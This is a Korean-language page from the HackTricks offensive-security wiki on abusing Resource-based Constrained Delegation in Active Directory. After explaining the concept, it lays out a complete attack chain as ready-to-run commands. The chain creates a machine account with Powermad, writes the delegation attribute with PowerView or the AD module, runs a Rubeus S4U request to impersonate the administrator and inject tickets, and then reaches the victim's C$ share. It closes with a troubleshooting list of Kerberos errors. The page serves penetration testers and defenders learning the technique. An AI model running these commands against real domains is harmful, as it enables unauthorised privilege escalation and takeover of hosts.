# Resource-based Constrained Delegation

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

<figure><img src="https://pentest.eu/RENDER_WebSec_10fps_21sec_9MB_29042024.gif" alt=""><figcaption></figcaption></figure>

{% embed url="https://websec.nl/" %}

## Resource-based Constrained Delegation의 기초

이것은 기본 [Constrained Delegation](constrained-delegation.md)와 유사하지만 **서비스에 대해 사용자를 가장할 수 있는 권한을 **객체**에 부여하는 대신**. Resource-based Constrained Delegation은 **그 객체에 대해 사용자를 가장할 수 있는 사람을 설정합니다**.

이 경우, 제약 객체는 _**msDS-AllowedToActOnBehalfOfOtherIdentity**_라는 속성을 가지며, 이 속성에는 그 객체에 대해 다른 사용자를 가장할 수 있는 사용자의 이름이 포함됩니다.

이 제약 위임의 또 다른 중요한 차이점은 **기계 계정에 대한 쓰기 권한**(_GenericAll/GenericWrite/WriteDacl/WriteProperty/etc_)이 있는 모든 사용자가 _**msDS-AllowedToActOnBehalfOfOtherIdentity**_를 설정할 수 있다는 것입니다 (다른 형태의 위임에서는 도메인 관리자 권한이 필요했습니다).

### 새로운 개념

제약 위임에서는 사용자의 _userAccountControl_ 값 내에 있는 **`TrustedToAuthForDelegation`** 플래그가 **S4U2Self**를 수행하는 데 필요하다고 언급되었습니다. 하지만 그것은 완전히 사실이 아닙니다.\
실제로는 그 값이 없더라도 **서비스**(SPN이 있는 경우)인 경우에는 어떤 사용자에 대해서도 **S4U2Self**를 수행할 수 있지만, **`TrustedToAuthForDelegation`**가 있으면 반환된 TGS는 **Forwardable**이 되고, **그 플래그가 없으면** 반환된 TGS는 **Forwardable**이 **아닙니다**.

그러나 **S4U2Proxy**에서 사용되는 **TGS**가 **Forwardable이 아닐 경우**, 기본 제약 위임을 악용하려고 하면 **작동하지 않습니다**. 하지만 **Resource-Based constrain delegation**을 악용하려고 하면 **작동합니다**(이는 취약점이 아니라 기능입니다, 분명히).

### 공격 구조

> **컴퓨터** 계정에 대해 **동등한 쓰기 권한**이 있는 경우 해당 머신에서 **특권 액세스**를 얻을 수 있습니다.

공격자가 이미 **희생자 컴퓨터에 대한 동등한 쓰기 권한**을 가지고 있다고 가정합니다.

1. 공격자는 **SPN**이 있는 계정을 **타락시키거나** (“Service A”) **하나를 생성합니다**. **특별한 권한이 없는** _Admin User_는 최대 10개의 **Computer objects** (_**MachineAccountQuota**_)를 **생성**하고 **SPN**을 설정할 수 있습니다. 따라서 공격자는 단순히 컴퓨터 객체를 생성하고 SPN을 설정할 수 있습니다.
2. 공격자는 희생자 컴퓨터(ServiceB)에 대한 **쓰기 권한**을 악용하여 **ServiceA가 해당 희생자 컴퓨터(ServiceB)에 대해 모든 사용자를 가장할 수 있도록 리소스 기반 제약 위임을 구성합니다**.
3. 공격자는 Rubeus를 사용하여 **특권 액세스가 있는 사용자**에 대해 Service A에서 Service B로 **전체 S4U 공격**(S4U2Self 및 S4U2Proxy)을 수행합니다.
   1. S4U2Self (타락시키거나 생성한 SPN에서): **관리자에게 TGS 요청** (Forwardable 아님).
   2. S4U2Proxy: 이전 단계의 **Forwardable이 아닌 TGS**를 사용하여 **희생자 호스트**에 대한 **관리자**의 **TGS**를 요청합니다.
   3. Forwardable이 아닌 TGS를 사용하더라도 Resource-based constrained delegation을 악용하고 있으므로 작동합니다.
   4. 공격자는 **티켓을 전달**하고 **사용자를 가장하여 희생자 ServiceB에 대한 **액세스**를 얻을 수 있습니다.

도메인의 _**MachineAccountQuota**_를 확인하려면 다음을 사용할 수 있습니다:
```powershell
Get-DomainObject -Identity "dc=domain,dc=local" -Domain domain.local | select MachineAccountQuota
```
## 공격

### 컴퓨터 객체 생성

[Powermad](https://github.com/Kevin-Robertson/Powermad)**를 사용하여 도메인 내에 컴퓨터 객체를 생성할 수 있습니다:**
```powershell
import-module powermad
New-MachineAccount -MachineAccount SERVICEA -Password $(ConvertTo-SecureString '123456' -AsPlainText -Force) -Verbose

# Check if created
Get-DomainComputer SERVICEA
```
### 리소스 기반 제약 위임 구성

**activedirectory PowerShell 모듈 사용**
```powershell
Set-ADComputer $targetComputer -PrincipalsAllowedToDelegateToAccount SERVICEA$ #Assing delegation privileges
Get-ADComputer $targetComputer -Properties PrincipalsAllowedToDelegateToAccount #Check that it worked
```
**파워뷰 사용하기**
```powershell
$ComputerSid = Get-DomainComputer FAKECOMPUTER -Properties objectsid | Select -Expand objectsid
$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$ComputerSid)"
$SDBytes = New-Object byte[] ($SD.BinaryLength)
$SD.GetBinaryForm($SDBytes, 0)
Get-DomainComputer $targetComputer | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}

#Check that it worked
Get-DomainComputer $targetComputer -Properties 'msds-allowedtoactonbehalfofotheridentity'

msds-allowedtoactonbehalfofotheridentity
----------------------------------------
{1, 0, 4, 128...}
```
### 완전한 S4U 공격 수행

우선, 우리는 비밀번호 `123456`로 새로운 컴퓨터 객체를 생성했으므로, 해당 비밀번호의 해시가 필요합니다:
```bash
.\Rubeus.exe hash /password:123456 /user:FAKECOMPUTER$ /domain:domain.local
```
이것은 해당 계정에 대한 RC4 및 AES 해시를 출력합니다.\
이제 공격을 수행할 수 있습니다:
```bash
rubeus.exe s4u /user:FAKECOMPUTER$ /aes256:<aes256 hash> /aes128:<aes128 hash> /rc4:<rc4 hash> /impersonateuser:administrator /msdsspn:cifs/victim.domain.local /domain:domain.local /ptt
```
Rubeus의 `/altservice` 매개변수를 사용하여 한 번 요청하는 것만으로 더 많은 티켓을 생성할 수 있습니다:
```bash
rubeus.exe s4u /user:FAKECOMPUTER$ /aes256:<AES 256 hash> /impersonateuser:administrator /msdsspn:cifs/victim.domain.local /altservice:krbtgt,cifs,host,http,winrm,RPCSS,wsman,ldap /domain:domain.local /ptt
```
{% hint style="danger" %}
사용자에게 "**위임할 수 없음**"이라는 속성이 있습니다. 사용자가 이 속성이 True로 설정되어 있으면, 그를 가장할 수 없습니다. 이 속성은 bloodhound 내에서 확인할 수 있습니다.
{% endhint %}

### 접근

마지막 명령줄은 **완전한 S4U 공격을 수행하고 TGS를** 관리자에서 피해자 호스트의 **메모리**로 주입합니다.\
이 예에서는 관리자로부터 **CIFS** 서비스에 대한 TGS가 요청되었으므로 **C$**에 접근할 수 있습니다:
```bash
ls \\victim.domain.local\C$
```
### Abuse different service tickets

[**사용 가능한 서비스 티켓에 대해 알아보세요**](silver-ticket.md#available-services).

## Kerberos Errors

* **`KDC_ERR_ETYPE_NOTSUPP`**: 이는 kerberos가 DES 또는 RC4를 사용하지 않도록 구성되어 있으며, RC4 해시만 제공하고 있음을 의미합니다. Rubeus에 최소한 AES256 해시(또는 rc4, aes128 및 aes256 해시를 모두 제공)를 제공하십시오. 예: `[Rubeus.Program]::MainString("s4u /user:FAKECOMPUTER /aes256:CC648CF0F809EE1AA25C52E963AC0487E87AC32B1F71ACC5304C73BF566268DA /aes128:5FC3D06ED6E8EA2C9BB9CC301EA37AD4 /rc4:EF266C6B963C0BB683941032008AD47F /impersonateuser:Administrator /msdsspn:CIFS/M3DC.M3C.LOCAL /ptt".split())`
* **`KRB_AP_ERR_SKEW`**: 이는 현재 컴퓨터의 시간이 DC의 시간과 다르며 kerberos가 제대로 작동하지 않음을 의미합니다.
* **`preauth_failed`**: 이는 주어진 사용자 이름 + 해시가 로그인에 실패했음을 의미합니다. 해시를 생성할 때 사용자 이름에 "$"를 넣는 것을 잊었을 수 있습니다 (`.\Rubeus.exe hash /password:123456 /user:FAKECOMPUTER$ /domain:domain.local`)
* **`KDC_ERR_BADOPTION`**: 이는 다음을 의미할 수 있습니다:
  * 당신이 가장하려는 사용자가 원하는 서비스에 접근할 수 없습니다 (가장할 수 없거나 충분한 권한이 없기 때문)
  * 요청한 서비스가 존재하지 않습니다 (winrm에 대한 티켓을 요청했지만 winrm이 실행되고 있지 않은 경우)
  * 생성된 fakecomputer가 취약한 서버에 대한 권한을 잃었으며, 이를 다시 부여해야 합니다.

## References

* [https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html](https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html)
* [https://www.harmj0y.net/blog/redteaming/another-word-on-delegation/](https://www.harmj0y.net/blog/redteaming/another-word-on-delegation/)
* [https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/resource-based-constrained-delegation-ad-computer-object-take-over-and-privilged-code-execution#modifying-target-computers-ad-object](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/resource-based-constrained-delegation-ad-computer-object-take-over-and-privilged-code-execution#modifying-target-computers-ad-object)
* [https://stealthbits.com/blog/resource-based-constrained-delegation-abuse/](https://stealthbits.com/blog/resource-based-constrained-delegation-abuse/)

<figure><img src="https://pentest.eu/RENDER_WebSec_10fps_21sec_9MB_29042024.gif" alt=""><figcaption></figcaption></figure>

{% embed url="https://websec.nl/" %}

{% hint style="success" %}
AWS 해킹 배우고 연습하기:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
GCP 해킹 배우고 연습하기: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks 지원하기</summary>

* [**구독 계획**](https://github.com/sponsors/carlospolop) 확인하기!
* **💬 [**Discord 그룹**](https://discord.gg/hRep4RUj7f) 또는 [**텔레그램 그룹**](https://t.me/peass)에 참여하거나 **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**를 팔로우하세요.**
* **[**HackTricks**](https://github.com/carlospolop/hacktricks) 및 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github 리포지토리에 PR을 제출하여 해킹 팁을 공유하세요.**

</details>
{% endhint %}
